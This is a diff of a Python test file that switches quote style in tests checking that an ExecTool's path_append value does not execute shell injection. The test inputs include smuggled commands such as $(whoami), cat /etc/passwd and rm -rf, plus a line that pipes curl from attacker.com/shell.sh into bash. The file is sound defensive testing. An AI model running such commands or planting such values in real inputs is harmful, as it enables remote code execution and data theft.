@@ -107,19 +107,19 @@ async def test_exec_allowed_env_keys_missing_var_ignored(monkeypatch):
     "malicious_path",
     [
         # semicolon — classic command separator
-        '/tmp/bin; echo INJECTED',
+        "/tmp/bin; echo INJECTED",
         # command substitution via $()
-        '/tmp/bin; echo $(whoami)',
+        "/tmp/bin; echo $(whoami)",
         # backtick command substitution
         "/tmp/bin; echo `id`",
         # pipe to another command
-        '/tmp/bin; cat /etc/passwd',
+        "/tmp/bin; cat /etc/passwd",
         # chained with &&
-        '/tmp/bin && curl http://attacker.com/shell.sh | bash',
+        "/tmp/bin && curl http://attacker.com/shell.sh | bash",
         # newline injection
-        '/tmp/bin\necho INJECTED',
+        "/tmp/bin\necho INJECTED",
         # mixed shell metacharacters
-        '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
+        "/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED",
     ],
 )
 async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path, tmp_path):
@@ -153,7 +153,7 @@ async def test_exec_path_append_command_substitution_does_not_execute(tmp_path):
     marker.write_text("SHOULD_NOT_APPEAR")
 
     tool = ExecTool(
-        path_append=f'/tmp/bin; echo $(cat {marker})',
+        path_append=f"/tmp/bin; echo $(cat {marker})",
     )
     result = await tool.execute(command="echo OK")
 
